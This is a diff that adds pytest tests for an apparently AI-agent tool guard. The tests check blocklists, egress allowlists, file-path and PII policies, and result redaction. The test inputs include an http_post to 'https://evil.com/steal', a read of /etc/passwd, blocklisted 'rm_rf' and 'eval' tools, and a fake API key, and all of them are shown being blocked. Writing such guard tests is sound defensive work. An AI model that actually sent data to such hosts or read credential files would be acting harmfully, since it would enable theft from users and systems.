@@ -1,0 +1,204 @@
+"""Guard 통합 테스트 — 정책 평가 순서 포함"""
+import pytest
+from asr.guard import Guard, BlockedToolError
+from asr.types import BeforeToolDecision, AfterToolDecision
+
+
+class TestGuardBeforeTool:
+    def setup_method(self):
+        self.guard = Guard(
+            domain_allowlist=["api.internal.com"],
+            file_path_allowlist=["/tmp/asr"],
+            pii_action="block",
+            block_egress=True,
+            tool_blocklist=["rm_rf", "eval"],
+            capability_policy={"network_send": "warn", "shell_exec": "block"},
+            default_action="warn",
+        )
+
+    def test_blocklist_highest_priority(self):
+        d = self.guard.before_tool("rm_rf", {"path": "/tmp/asr/safe"})
+        assert isinstance(d, BeforeToolDecision)
+        assert d.action == "block"
+        assert d.policy_id == "tool_blocklist"
+
+    def test_egress_blocks_external_domain(self):
+        d = self.guard.before_tool("http_post", {"url": "https://evil.com/steal"}, capabilities=["network_send"])
+        assert d.action == "block"
+        assert d.policy_id == "domain_allowlist"
+
+    def test_egress_allows_internal_domain(self):
+        """allowlist 도메인 → egress 통과 → 세부 정책 해당 → capability 건너뜀 → allow"""
+        d = self.guard.before_tool("http_post", {"url": "https://api.internal.com/data"}, capabilities=["network_send"])
+        assert d.action in ("allow", "warn")
+        assert d.policy_id != "capability_policy"
+
+    def test_file_path_blocks_unauthorized(self):
+        d = self.guard.before_tool("file_read", {"path": "/etc/passwd"})
+        assert d.action == "block"
+        assert d.policy_id == "file_path_allowlist"
+
+    def test_file_path_allows_authorized(self):
+        d = self.guard.before_tool("file_write", {"path": "/tmp/asr/output.txt"})
+        assert d.action == "allow"
+
+    def test_pii_blocks(self):
+        d = self.guard.before_tool("send_email", {"body": "API key: sk-abc123def456ghi789jkl012mno345pqr678"})
+        assert d.action == "block"
+        assert d.policy_id == "pii_detection"
+
+    def test_capability_shell_exec_blocks(self):
+        """No URL, no file path, no PII → no specific policy matched → capability fallback applies"""
+        d = self.guard.before_tool("run_command", {"cmd": "ls"}, capabilities=["shell_exec"])
+        assert d.action == "block"
+        assert d.policy_id == "capability_policy"
+
+    def test_default_action_for_unknown_tool(self):
+        d = self.guard.before_tool("totally_new_tool", {"x": "y"})
+        assert d.action == "warn"
+        assert d.policy_id == "default_action"
+
+    def test_capability_is_true_fallback(self):
+        """Capability는 진짜 fallback: 세부 정책이 해당된 도구는 capability를 다시 평가하지 않는다."""
+        guard = Guard(
+            domain_allowlist=["api.internal.com"],
+            block_egress=True,
+            capability_policy={"network_send": "block"},
+        )
+        d = guard.before_tool("http_post", {"url": "https://api.internal.com/data"}, capabilities=["network_send"])
+        assert d.action in ("allow", "warn")
+        assert d.policy_id != "capability_policy"
+
+    def test_redacted_args_masks_pii(self):
+        d = self.guard.before_tool("send_email", {"to": "victim@example.com", "body": "normal text"})
+        assert "victim@example.com" not in str(d.redacted_args)
+
+    def test_capabilities_in_decision(self):
+        d = self.guard.before_tool("http_post", {"url": "https://evil.com"}, capabilities=["network_send"])
+        assert d.capabilities == ["network_send"]
+
+
+class TestGuardCallbacks:
+    def test_on_block_callback(self):
+        blocked = []
+        guard = Guard(tool_blocklist=["dangerous"], on_block=lambda d: blocked.append(d))
+        guard.before_tool("dangerous", {})
+        assert len(blocked) == 1
+
+    def test_on_warn_callback(self):
+        warned = []
+        guard = Guard(default_action="warn", on_warn=lambda d: warned.append(d))
+        guard.before_tool("new_tool", {})
+        assert len(warned) == 1
+
+
+class TestGuardAfterTool:
+    def test_allow_clean_result(self):
+        guard = Guard(pii_action="block")
+        d = guard.after_tool("search", "Normal search result text")
+        assert isinstance(d, AfterToolDecision)
+        assert d.action == "allow"
+
+    def test_redact_result_with_pii_string(self):
+        guard = Guard(pii_action="block")
+        d = guard.after_tool("search", "Found: admin@secret.com in records")
+        assert d.action == "redact_result"
+        assert isinstance(d.redacted_result, str)
+        assert "admin@secret.com" not in d.redacted_result
+
+    def test_redact_result_preserves_dict(self):
+        guard = Guard(pii_action="block")
+        d = guard.after_tool("search", {"name": "John", "email": "admin@secret.com"})
+        assert d.action == "redact_result"
+        assert isinstance(d.redacted_result, dict)
+        assert "admin@secret.com" not in str(d.redacted_result)
+
+    def test_redact_result_preserves_list(self):
+        guard = Guard(pii_action="block")
+        d = guard.after_tool("search", ["normal", "admin@secret.com"])
+        assert d.action == "redact_result"
+        assert isinstance(d.redacted_result, list)
+
+    def test_warn_pii_in_result(self):
+        guard = Guard(pii_action="warn")
+        d = guard.after_tool("search", "Found: admin@secret.com")
+        assert d.action == "warn"
+
+    def test_pii_off_allows_all(self):
+        guard = Guard(pii_action="off")
+        d = guard.after_tool("search", "Found: admin@secret.com")
+        assert d.action == "allow"
+
+
+class TestProtectDecorator:
+    def test_allowed_function_runs(self):
+        guard = Guard(default_action="allow")
+
+        @guard.protect
+        def safe_function():
+            return "result"
+
+        assert safe_function() == "result"
+
+    def test_blocked_function_raises(self):
+        guard = Guard(tool_blocklist=["dangerous_action"])
+
+        @guard.protect
+        def dangerous_action():
+            return "should not reach"
+
+        with pytest.raises(BlockedToolError) as exc_info:
+            dangerous_action()
+        assert exc_info.value.decision.action == "block"
+
+    def test_capabilities_passed(self):
+        guard = Guard(capability_policy={"shell_exec": "block"})
+
+        @guard.protect(capabilities=["shell_exec"])
+        def run_shell():
+            return "output"
+
+        with pytest.raises(BlockedToolError):
+            run_shell()
+
+    def test_result_redaction(self):
+        guard = Guard(pii_action="block")
+
+        @guard.protect
+        def search_data():
+            return "Found email: admin@secret.com in database"
+
+        result = search_data()
+        assert "admin@secret.com" not in result
+        assert "[EMAIL]" in result
+
+    def test_positional_args_checked(self):
+        """Positional args must also be inspected for PII"""
+        guard = Guard(pii_action="block")
+
+        @guard.protect
+        def send_email(to, subject, body):
+            return "sent"
+
+        with pytest.raises(BlockedToolError):
+            send_email("victim@example.com", "test", "normal body")
+
+    def test_after_tool_preserves_dict_type(self):
+        guard = Guard(pii_action="block")
+
+        @guard.protect
+        def search():
+            return {"name": "John", "email": "admin@secret.com"}
+
+        result = search()
+        assert isinstance(result, dict)
+        assert "admin@secret.com" not in str(result)
+
+    def test_warn_does_not_block(self):
+        guard = Guard(default_action="warn")
+
+        @guard.protect
+        def some_tool():
+            return 42
+
+        assert some_tool() == 42
